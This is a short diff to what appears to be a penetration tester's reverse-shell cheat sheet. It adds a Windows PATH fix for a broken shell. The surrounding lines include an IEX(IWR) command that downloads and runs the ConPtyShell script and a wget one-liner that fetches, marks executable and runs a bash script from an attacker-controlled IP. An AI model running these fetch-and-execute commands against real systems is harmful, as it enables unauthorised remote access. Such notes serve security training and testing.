@@ -89,6 +89,9 @@
 - https://github.com/antonioCoco/ConPtyShell
 ## From Webshell 
 It's important to have the same rows and cols size between your terminal and the remote terminal if you want to have an aligned output on the shell.
+## Fix shell
+1. if command not found: ```set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0; ```
+
 
 #### Method 1
 In this method the terminal size is set without you pass the rows and cols parameters to Invoke-ConPtyShell function:
@@ -202,3 +205,4 @@ IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-
 - wget
 ### Oneliner 
 - ``` wget 192.168.45.176/bash.sh -O /tmp/bash.sh && chmod +x /tmp/bash.sh && /tmp/bash.sh  ```
+
